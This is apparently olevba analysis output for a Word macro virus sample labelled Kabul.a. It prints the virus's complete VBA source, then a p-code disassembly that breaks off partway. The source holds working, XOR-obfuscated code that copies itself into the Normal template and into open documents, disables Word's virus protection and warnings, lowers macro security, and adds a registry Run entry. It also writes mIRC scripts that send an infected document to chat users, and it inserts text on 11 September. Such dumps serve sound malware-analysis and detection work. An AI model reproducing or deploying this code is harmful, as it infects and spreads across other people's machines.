olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Kabul.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Kabul.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: ./Virus.MSWord.Kabul.a - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Kabul
Private Sub FileClose()
Call Kabul
End Sub
Private Sub Document_Close()
Call Kabul
End Sub
Private Sub AutoClose()
Call Kabul
End Sub
Private Sub Kabul()
On Error Resume Next
Set nor = NormalTemplate.VBProject.VBComponents(((((((((((((((((((((1))))))))))))))))))))).CodeModule
Set ths = ThisDocument.VBProject.VBComponents(((((((((((((((((((((1))))))))))))))))))))).CodeModule
mycode = ths.Lines(((((((((((((((((((((1)))))))))))))))))))), ((((((((((((((((((((300)))))))))))))))))))))
Open Crypt("f?YrlkajrvYv|vq`hYndgpi+sgv", 5) For Output As #1
Print #1, Crypt("V`q%ndgpi%8%RVfwluq+Fw`dq`Jgo`fq-", 5) & Chr(34) & Crypt("Rjwa+Duuilfdqljk", 5) & Chr(34) & Crypt(",", 5)
Print #1, Crypt("ndgpi+Juqljkv+SlwpvUwjq`fqljk%8%5", 5)
Print #1, Crypt("ndgpi+Juqljkv+Vds`KjwhdiUwjhuq%8%5", 5)
Print #1, Crypt("ndgpi+Juqljkv+FjkclwhFjks`wvljkv%8%5", 5)
Print #1, Crypt("Cjw%}%8%4%Qj%ndgpi+KjwhdiQ`huidq`+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+FjpkqJcIlk`v", 5)
Print #1, Crypt("Ndgpi+KjwhdiQ`huidq`+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+A`i`q`Ilk`v%4", 5)
Print #1, Crypt("K`}q", 5)
Print #1, Crypt("Ndgpi+KjwhdiQ`huidq`+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+DaaCwjhCli`%-", 5) & Chr(34) & Crypt("F?YrlkajrvYv|vq`hYndgpi+GDV", 5) & Chr(34) & Crypt(",", 5)
Print #1, Crypt("ndgpi+Duuilfdqljk+Tplq", 5)
Close #1
Open Crypt("f?YRlkajrvYv|vq`hYndgpi+gdv", 5) For Output As #1
Print #1, mycode
Close #1
System.PrivateProfileString("", Crypt("MN@\ZIJFDIZHDFMLK@YVjcqrdw`YHlfwjvjcqYRlkajrvYFpww`kqS`wvljkYWpk", 5), Crypt("Ndgpi", 5)) = Crypt("F?YRlkajrvYv|vq`hYndgpi+SGV", 5)
System.PrivateProfileString("", Crypt("MN@\ZFPWW@KQZPV@WYVjcqrdw`YHlfwjvjcqYJcclf`Y<+5YRjwaYV`fpwlq|", 5), Crypt("I`s`i", 5)) = 1&
With Options
.VirusProtection = ((((((((((((((((((((0))))))))))))))))))))
.ConfirmConversions = ((((((((((((((((((((0))))))))))))))))))))
.SaveNormalPrompt = ((((((((((((((((((((0))))))))))))))))))))
.Application.ScreenUpdating = ((((((((((((((((((((0))))))))))))))))))))
.Application.EnableCancelKey = wdCancelDisabled
.Application.ShowVisualBasicEditor = ((((((((((((((((((((0))))))))))))))))))))
.Application.DisplayAlerts = wdAlertsNone
.Application.DisplayStatusBar = ((((((((((((((((((((0))))))))))))))))))))
End With
CommandBars(Crypt("Qjjiv", 5)).Controls(Crypt("Hdfwj", 5)).Enabled = ((((((((((((((((((((0))))))))))))))))))))
installation$ = Crypt("f?YrlkajrvYv|vq`hYajkqw`dah`+ajf", 5)
ths.SaveAs installation$
For i = ((((((((((((((((((((1)))))))))))))))))))) To Documents.Count
If Documents(i).VBProject.VBComponents(((((((((((((((((((((1))))))))))))))))))))).CodeModule.Lines(((((((((((((((((((((1)))))))))))))))))))), ((((((((((((((((((((1))))))))))))))))))))) <> "'Kabul" Then actins = ((((((((((((((((((((0)))))))))))))))))))) Else actins = ((((((((((((((((((((1))))))))))))))))))))
If actins = ((((((((((((((((((((0)))))))))))))))))))) Then
With Documents(i).VBProject.VBComponents(((((((((((((((((((((1))))))))))))))))))))).CodeModule
.DeleteLines ((((((((((((((((((((1)))))))))))))))))))), .CountOfLines
.addfromstring mycode
End With
End If
Next
If nor.Lines(((((((((((((((((((((1)))))))))))))))))))), ((((((((((((((((((((1))))))))))))))))))))) <> "'Kabul" Then norins = ((((((((((((((((((((0)))))))))))))))))))) Else norins = ((((((((((((((((((((1))))))))))))))))))))
If norins = ((((((((((((((((((((0)))))))))))))))))))) Then
With nor
.DeleteLines ((((((((((((((((((((1)))))))))))))))))))), .CountOfLines
.addfromstring mycode
End With
NormalTemplate.Save
End If
Pathy = Crypt("F?YrlkajrvYv|vq`hYajkqw`da+lkl", 5)
Open Pathy For Output As #1
Dim j(27) As String
j(0) = "^VFWLUQX"
j(1) = "k58JK%4?OJLK?&?~%*LC%-%!klfn%88%!h`%,%~%mdiq%x"
j(2) = "k48%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(3) = "k78x"
j(4) = "k68JK%4?UDWQ?&?~%*LC%-%!klfn%88%!h`%,%~%mdiq%x"
j(5) = "k18%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(6) = "k08x"
j(7) = "k38Jk%4?Q@]Q?/gpvm/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(8) = "k28%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(9) = "k=8x"
j(10) = "k<8Jk%4?Q@]Q?/pvdhd/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(11) = "k458%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(12) = "k448x"
j(13) = "k478Jk%4?Q@]Q?/ida`k/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(14) = "k468%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(15) = "k418x"
j(16) = "k408Jk%4?Q@]Q?/rqf/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(17) = "k438%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(18) = "k428x"
j(19) = "k4=8Jk%4?Q@]Q?/k|/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(20) = "k4<8%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(21) = "k758x"
j(22) = "k748Jk%4?Q@]Q?/b`jwb`/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(23) = "k778%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(24) = "k768x"
j(25) = "k718Jk%4?Q@]Q?/dcbdklvqdk/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
j(26) = "k708%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
j(27) = "k738x"
For i = 0 To 27
Print #1, Crypt(j(i), 5)
Next
Close #1
Dim dest(((((((((((((((((((((4))))))))))))))))))))) As String
dest(((((((((((((((((((((1))))))))))))))))))))) = Crypt("f?YhlwfYv|vq`hYvfwluq+lkl", 5)
dest(((((((((((((((((((((2))))))))))))))))))))) = Crypt("f?Yhlwf67Yv|vq`hYvfwluq+lkl", 5)
dest(((((((((((((((((((((3))))))))))))))))))))) = Crypt("f?Yuwjbwd{4YhlwfYvfwluq+lkl", 5)
dest(((((((((((((((((((((4))))))))))))))))))))) = Crypt("f?Yuwjbwd{4Yhlwf67Yvfwluq+lkl", 5)
For i = ((((((((((((((((((((1)))))))))))))))))))) To ((((((((((((((((((((4))))))))))))))))))))
SetAttr dest(((((((((((((((((((((i))))))))))))))))))))), vbNormal
Shell Crypt("fju|%", 5) & Pathy & Crypt("%", 5) & dest(i)
Next
If Day(Now()) = ((((((((((((((((((((11)))))))))))))))))))) And Month(Now()) = ((((((((((((((((((((9)))))))))))))))))))) Then
With Documents(((((((((((((((((((((1))))))))))))))))))))).Content
.Font.Name = Crypt("Rlkbalkbv", 5)
.Font.Size = ((((((((((((((((((((72))))))))))))))))))))
.InsertAfter Crypt("T66K\", 5)
End With
End If
End Sub
Private Function Crypt(q33ny, key)
For i = 1 To Len(q33ny)
Crypt = Crypt & Chr(Asc(Mid(q33ny, i, 1)) Xor key)
Next
q33ny = ""
End Function


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Kabul.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/ThisDocument1 - 11272 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0005 "Kabul"
' Line #2:
' 	FuncDefn (Private Sub FileClose())
' Line #3:
' 	ArgsCall (Call) Kabul 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Private Sub Document_Close())
' Line #6:
' 	ArgsCall (Call) Kabul 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Private Sub AutoClose())
' Line #9:
' 	ArgsCall (Call) Kabul 0x0000 
' Line #10:
' 	EndSub 
' Line #11:
' 	FuncDefn (Private Sub Kabul())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ths 
' Line #15:
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	LitDI2 0x012C 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Ld ths 
' 	ArgsMemLd Lines 0x0002 
' 	St mycode 
' Line #16:
' 	LitStr 0x001B "f?YrlkajrvYv|vq`hYndgpi+sgv"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "V`q%ndgpi%8%RVfwluq+Fw`dq`Jgo`fq-"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Rjwa+Duuilfdqljk"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ","
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	Concat 
' 	PrintItemNL 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "ndgpi+Juqljkv+SlwpvUwjq`fqljk%8%5"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "ndgpi+Juqljkv+Vds`KjwhdiUwjhuq%8%5"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	PrintItemNL 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "ndgpi+Juqljkv+FjkclwhFjks`wvljkv%8%5"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0058 "Cjw%}%8%4%Qj%ndgpi+KjwhdiQ`huidq`+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+FjpkqJcIlk`v"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	PrintItemNL 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004C "Ndgpi+KjwhdiQ`huidq`+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+A`i`q`Ilk`v%4"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "K`}q"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004C "Ndgpi+KjwhdiQ`huidq`+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+DaaCwjhCli`%-"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001B "F?YrlkajrvYv|vq`hYndgpi+GDV"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ","
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	Concat 
' 	PrintItemNL 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "ndgpi+Duuilfdqljk+Tplq"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #27:
' 	LitStr 0x001B "f?YRlkajrvYv|vq`hYndgpi+gdv"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld mycode 
' 	PrintItemNL 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #30:
' 	LitStr 0x001B "F?YRlkajrvYv|vq`hYndgpi+SGV"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "MN@\ZIJFDIZHDFMLK@YVjcqrdw`YHlfwjvjcqYRlkajrvYFpww`kqS`wvljkYWpk"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitStr 0x0005 "Ndgpi"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #31:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "MN@\ZFPWW@KQZPV@WYVjcqrdw`YHlfwjvjcqYJcclf`Y<+5YRjwaYV`fpwlq|"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitStr 0x0005 "I`s`i"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #32:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #33:
' 	LitDI2 0x0000 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	MemStWith VirusProtection 
' Line #34:
' 	LitDI2 0x0000 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	MemStWith ConfirmConversions 
' Line #35:
' 	LitDI2 0x0000 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	MemStWith SaveNormalPrompt 
' Line #36:
' 	LitDI2 0x0000 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	MemLdWith Application 
' 	MemSt ScreenUpdating 
' Line #37:
' 	Ld wdCancelDisabled 
' 	MemLdWith Application 
' 	MemSt EnableCancelKey 
' Line #38:
' 	LitDI2 0x0000 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	MemLdWith Application 
' 	MemSt ShowVisualBasicEditor 
' Line #39:
' 	Ld wdAlertsNone 
' 	MemLdWith Application 
' 	MemSt DisplayAlerts 
' Line #40:
' 	LitDI2 0x0000 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	MemLdWith Application 
' 	MemSt DisplayStatusBar 
' Line #41:
' 	EndWith 
' Line #42:
' 	LitDI2 0x0000 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	LitStr 0x0005 "Hdfwj"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	LitStr 0x0005 "Qjjiv"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #43:
' 	LitStr 0x0020 "f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	St installation$ 
' Line #44:
' 	Ld installation$ 
' 	Ld ths 
' 	ArgsMemCall SaveAs 0x0001 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #46:
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "'Kabul"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	St actins 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	St actins 
' 	EndIf 
' Line #47:
' 	Ld actins 
' 	LitDI2 0x0000 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Eq 
' 	IfBlock 
' Line #48:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #49:
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #50:
' 	Ld mycode 
' 	ArgsMemCallWith addfromstring 0x0001 
' Line #51:
' 	EndWith 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	StartForVariable 
' 	Next 
' Line #54:
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Ld nor 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "'Kabul"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	St norins 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	St norins 
' 	EndIf 
' Line #55:
' 	Ld norins 
' 	LitDI2 0x0000 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Eq 
' 	IfBlock 
' Line #56:
' 	StartWithExpr 
' 	Ld nor 
' 	With 
' Line #57:
' 	LitDI2 0x0001 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	Paren 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #58:
' 	Ld mycode 
' 	ArgsMemCallWith addfromstring 0x0001 
' Line #59:
' 	EndWith 
' Line #60:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	LitStr 0x001E "F?YrlkajrvYv|vq`hYajkqw`da+lkl"
' 	LitDI2 0x0005 
' 	ArgsLd Crypt 0x0002 
' 	St Pathy 
' Line #63:
' 	Ld Pathy 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #64:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x001B 
' 	VarDefn j (As String)
' Line #65:
' 	LitStr 0x0008 "^VFWLUQX"
' 	LitDI2 0x0000 
' 	ArgsSt j 0x0001 
' Line #66:
' 	LitStr 0x002E "k58JK%4?OJLK?&?~%*LC%-%!klfn%88%!h`%,%~%mdiq%x"
' 	LitDI2 0x0001 
' 	ArgsSt j 0x0001 
' Line #67:
' 	LitStr 0x0034 "k48%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
' 	LitDI2 0x0002 
' 	ArgsSt j 0x0001 
' Line #68:
' 	LitStr 0x0004 "k78x"
' 	LitDI2 0x0003 
' 	ArgsSt j 0x0001 
' Line #69:
' 	LitStr 0x002E "k68JK%4?UDWQ?&?~%*LC%-%!klfn%88%!h`%,%~%mdiq%x"
' 	LitDI2 0x0004 
' 	ArgsSt j 0x0001 
' Line #70:
' 	LitStr 0x0034 "k18%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
' 	LitDI2 0x0005 
' 	ArgsSt j 0x0001 
' Line #71:
' 	LitStr 0x0004 "k08x"
' 	LitDI2 0x0006 
' 	ArgsSt j 0x0001 
' Line #72:
' 	LitStr 0x0034 "k38Jk%4?Q@]Q?/gpvm/?&?~%*LC%-%!klfn%88%!h`%x%~%mdiqx"
' 	LitDI2 0x0007 
' 	ArgsSt j 0x0001 
' Line #73:
' 	LitStr 0x0034 "k28%*aff%v`ka%!klfn%f?YrlkajrvYv|vq`hYajkqw`dah`+ajf"
